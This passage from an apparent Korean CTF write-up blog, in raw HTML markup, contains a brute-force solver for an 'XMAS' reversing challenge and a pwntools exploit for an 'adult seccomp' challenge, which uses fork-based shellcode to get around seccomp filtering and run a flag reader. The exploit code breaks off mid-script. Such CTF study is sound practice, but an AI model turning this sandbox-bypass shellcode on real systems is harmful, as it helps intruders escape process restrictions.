6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0F9B9DF6F</span>,<span style="color:#0099cc">0x8EBEEFF9</span>,<span style="color:#0099cc">0x17B7BE43</span>,<span style="color:#0099cc">0x60B08ED5</span>,<span style="color:#0099cc">0x0D6D6A3E8</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0A1D1937E</span>,<span style="color:#0099cc">0x38D8C2C4</span>,<span style="color:#0099cc">0x4FDFF252</span>,<span style="color:#0099cc">0x0D1BB67F1</span>,<span style="color:#0099cc">0x0A6BC5767</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x3FB506</span>,<span style="color:#0099cc">0x48B2364B</span>,<span style="color:#0099cc">0x0D80D2BDA</span>,<span style="color:#0099cc">0x0AF0A1B4C</span>,<span style="color:#0099cc">0x36034AF6</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x41047A60</span>,<span style="color:#0099cc">0x0DF60EFC3</span>,<span style="color:#0099cc">0x0A867DF55</span>,<span style="color:#0099cc">0x316E8EEF</span>,<span style="color:#0099cc">0x4669BE79</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0CB61B38C</span>,<span style="color:#0099cc">0x0BC66831A</span>,<span style="color:#0099cc">0x256FD2A0</span>,<span style="color:#0099cc">0x5268E236</span>,<span style="color:#0099cc">0x0CC0C7795</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0BB0B4703</span>,<span style="color:#0099cc">0x220216B9</span>,<span style="color:#0099cc">0x5505262F</span>,<span style="color:#0099cc">0x0C5BA3BBE</span>,<span style="color:#0099cc">0x0B2BD0B28</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x2BB45A92</span>,<span style="color:#0099cc">0x5CB36A04</span>,<span style="color:#0099cc">0x0C2D7FFA7</span>,<span style="color:#0099cc">0x0B5D0CF31</span>,<span style="color:#0099cc">0x2CD99E8B</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x5BDEAE1D</span>,<span style="color:#0099cc">0x9B64C2B0</span>,<span style="color:#0099cc">0x0EC63F226</span>,<span style="color:#0099cc">0x756AA39C</span>,<span style="color:#0099cc">0x26D930A</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x9C0906A9</span>,<span style="color:#0099cc">0x0EB0E363F</span>,<span style="color:#0099cc">0x72076785</span>,<span style="color:#0099cc">0x5005713</span>,<span style="color:#0099cc">0x95BF4A82</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0E2B87A14</span>,<span style="color:#0099cc">0x7BB12BAE</span>,<span style="color:#0099cc">0x0CB61B38</span>,<span style="color:#0099cc">0x92D28E9B</span>,<span style="color:#0099cc">0x0E5D5BE0D</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x7CDCEFB7</span>,<span style="color:#0099cc">0x0BDBDF21</span>,<span style="color:#0099cc">0x86D3D2D4</span>,<span style="color:#0099cc">0x0F1D4E242</span>,<span style="color:#0099cc">0x68B3F8</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x1FDA836E</span>,<span style="color:#0099cc">0x81BE16CD</span>,<span style="color:#0099cc">0x0F6B9265B</span>,<span style="color:#0099cc">0x6FB077E1</span>,<span style="color:#0099cc">0x18B74777</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x88085AE6</span>,<span style="color:#0099cc">0x0FF0F6A70</span>,<span style="color:#0099cc">0x66063BCA</span>,<span style="color:#0099cc">0x11010B5C</span>,<span style="color:#0099cc">0x8F659EFF</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0F862AE69</span>,<span style="color:#0099cc">0x616BFFD3</span>,<span style="color:#0099cc">0x166CCF45</span>,<span style="color:#0099cc">0x0A00AE278</span>,<span style="color:#0099cc">0x0D702EE</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x4E048354</span>,<span style="color:#0099cc">0x3903B3C2</span>,<span style="color:#0099cc">0x0A7672661</span>,<span style="color:#0099cc">0x0D06016F7</span>,<span style="color:#0099cc">0x4969474D</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x3E6E77DB</span>,<span style="color:#0099cc">0x0AED16A4A</span>,<span style="color:#0099cc">0x0D9D65ADC</span>,<span style="color:#0099cc">0x40DF0B66</span>,<span style="color:#0099cc">0x37D83BF0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0A9BCAE53</span>,<span style="color:#0099cc">0x0DEBB9EC5</span>,<span style="color:#0099cc">0x47B2CF7F</span>,<span style="color:#0099cc">0x30B5FFE9</span>,<span style="color:#0099cc">0x0BDBDF21C</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x0CABAC28A</span>,<span style="color:#0099cc">0x53B39330</span>,<span style="color:#0099cc">0x24B4A3A6</span>,<span style="color:#0099cc">0x0BAD03605</span>,<span style="color:#0099cc">0x0C70693</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x54DE5729</span>,<span style="color:#0099cc">0x23D967BF</span>,<span style="color:#0099cc">0x0B3667A2E</span>,<span style="color:#0099cc">0x0C4614AB8</span>,<span style="color:#0099cc">0x5D681B02</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">,<span style="color:#0099cc">0x2A6F2B94</span>,<span style="color:#0099cc">0x0B40BBE37</span>,<span style="color:#0099cc">0x0C30C8EA1</span>,<span style="color:#0099cc">0x5A05DF1B</span>,<span style="color:#0099cc">0x2D02EF8D</span>]</div><div style="padding:0 6px; white-space:pre; line-height:130%">enc<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>[<span style="color:#0099cc">0x376740b3</span>,<span style="color:#0099cc">0x94789c6e</span>,<span style="color:#0099cc">0x66485793</span>,<span style="color:#0099cc">0x56e8bf0e</span>,<span style="color:#0099cc">0xd5f139c0</span>]</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">flag<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#63a35c">'XMAS{'</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">flag_fake<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#63a35c">''</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">import</span>&nbsp;string</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">for</span>&nbsp;i&nbsp;<span style="color:#a71d5d">in</span>&nbsp;string.printable:</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0xff</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0xead54739</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'0&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0xc6</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0xcb61b38c</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'1&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0x34</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0x1ca7eafb</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'2&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0xfb</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0x94643b84</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'3&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#066de2">print</span>(<span style="color:#63a35c">'---'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">for</span>&nbsp;i&nbsp;<span style="color:#a71d5d">in</span>&nbsp;string.printable:</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0xff</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0x4db2615</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'0&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0xea</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0x6906c2fe</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'1&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0x27</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0x5edef90e</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'2&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0xe8</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0x9309ff9d</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'3&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#066de2">print</span>(<span style="color:#63a35c">'---'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">for</span>&nbsp;i&nbsp;<span style="color:#a71d5d">in</span>&nbsp;string.printable:</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0xff</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0x17b7be43</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'0&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0xbc</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0xbdbdf21</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'1&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0x60</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0x646ba8c0</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'2&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0x57</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0xedb8832</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'3&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#066de2">print</span>(<span style="color:#63a35c">'---'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">for</span>&nbsp;i&nbsp;<span style="color:#a71d5d">in</span>&nbsp;string.printable:</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0xff</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0xf9b9df6f</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'0&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0x90</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0x4e048354</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'1&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0x74</span>^ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0x83d385c7</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'2&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">if</span>(dword[<span style="color:#0099cc">0x02</span>&nbsp;^&nbsp;ord(i)]&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>&nbsp;<span style="color:#0099cc">0xc0ba6cad</span>):</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#066de2">print</span>(<span style="color:#63a35c">'3&nbsp;:&nbsp;'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>i)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div></div><div style="text-align:right;margin-top:-13px;margin-right:5px;font-size:9px;font-style:italic"><a href="http://colorscripter.com/info#e" target="_blank" style="color:#e5e5e5text-decoration:none">Colored by Color Scripter</a></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>



# 시간안에 못푼거

## adult seccomp

https://pwn3r.tistory.com/entry/SECCON-2018-QUAL-Simple-memo?category=801826

여기 있는거 복붙한다. 하지만 조금 바꿔야 한다.

![image-20200101195725730](https://github.com/aht7525/aht7525.github.io/blob/master/img/image-20200101195725730.png?raw=true)

대충 사진에 있는 것처럼 clone을 이용하려 하였지만 seccomp이 걸려 있어서 fork를 사용하였다.

fork 설명 : https://thdev.net/176

그리고 readflag라는 실행파일을 실행시키는 것으로 바꾸었다.

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div><div style="line-height:130%">2</div><div style="line-height:130%">3</div><div style="line-height:130%">4</div><div style="line-height:130%">5</div><div style="line-height:130%">6</div><div style="line-height:130%">7</div><div style="line-height:130%">8</div><div style="line-height:130%">9</div><div style="line-height:130%">10</div><div style="line-height:130%">11</div><div style="line-height:130%">12</div><div style="line-height:130%">13</div><div style="line-height:130%">14</div><div style="line-height:130%">15</div><div style="line-height:130%">16</div><div style="line-height:130%">17</div><div style="line-height:130%">18</div><div style="line-height:130%">19</div><div style="line-height:130%">20</div><div style="line-height:130%">21</div><div style="line-height:130%">22</div><div style="line-height:130%">23</div><div style="line-height:130%">24</div><div style="line-height:130%">25</div><div style="line-height:130%">26</div><div style="line-height:130%">27</div><div style="line-height:130%">28</div><div style="line-height:130%">29</div><div style="line-height:130%">30</div><div style="line-height:130%">31</div><div style="line-height:130%">32</div><div style="line-height:130%">33</div><div style="line-height:130%">34</div><div style="line-height:130%">35</div><div style="line-height:130%">36</div><div style="line-height:130%">37</div><div style="line-height:130%">38</div><div style="line-height:130%">39</div><div style="line-height:130%">40</div><div style="line-height:130%">41</div><div style="line-height:130%">42</div><div style="line-height:130%">43</div><div style="line-height:130%">44</div><div style="line-height:130%">45</div><div style="line-height:130%">46</div><div style="line-height:130%">47</div><div style="line-height:130%">48</div><div style="line-height:130%">49</div><div style="line-height:130%">50</div><div style="line-height:130%">51</div><div style="line-height:130%">52</div><div style="line-height:130%">53</div><div style="line-height:130%">54</div><div style="line-height:130%">55</div><div style="line-height:130%">56</div><div style="line-height:130%">57</div><div style="line-height:130%">58</div><div style="line-height:130%">59</div><div style="line-height:130%">60</div><div style="line-height:130%">61</div><div style="line-height:130%">62</div><div style="line-height:130%">63</div><div style="line-height:130%">64</div><div style="line-height:130%">65</div><div style="line-height:130%">66</div><div style="line-height:130%">67</div><div style="line-height:130%">68</div><div style="line-height:130%">69</div><div style="line-height:130%">70</div><div style="line-height:130%">71</div><div style="line-height:130%">72</div><div style="line-height:130%">73</div><div style="line-height:130%">74</div><div style="line-height:130%">75</div><div style="line-height:130%">76</div><div style="line-height:130%">77</div><div style="line-height:130%">78</div><div style="line-height:130%">79</div><div style="line-height:130%">80</div><div style="line-height:130%">81</div><div style="line-height:130%">82</div><div style="line-height:130%">83</div><div style="line-height:130%">84</div><div style="line-height:130%">85</div><div style="line-height:130%">86</div><div style="line-height:130%">87</div><div style="line-height:130%">88</div><div style="line-height:130%">89</div><div style="line-height:130%">90</div><div style="line-height:130%">91</div><div style="line-height:130%">92</div><div style="line-height:130%">93</div><div style="line-height:130%">94</div><div style="line-height:130%">95</div><div style="line-height:130%">96</div><div style="line-height:130%">97</div><div style="line-height:130%">98</div><div style="line-height:130%">99</div><div style="line-height:130%">100</div><div style="line-height:130%">101</div><div style="line-height:130%">102</div><div style="line-height:130%">103</div><div style="line-height:130%">104</div><div style="line-height:130%">105</div><div style="line-height:130%">106</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">from</span>&nbsp;pwn&nbsp;<span style="color:#a71d5d">import</span>&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">*</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">context.arch<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#63a35c">'amd64'</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">r<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>process(<span style="color:#63a35c">'./problem'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">shellcode<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#63a35c">''</span><span style="color:#63a35c">'</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;rbp</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rbp,rsp</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,57</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;rax,rax</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jz&nbsp;child</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdx,0x30000000</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delay:</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dec&nbsp;rdx</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;rdx,rdx</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jnz&nbsp;delay</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;rax</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;waitpid(childpid,&nbsp;NULL,&nbsp;0)&nbsp;*/</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdi,rax</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rsi,0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdx,0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;r10,0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,0x3d</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span 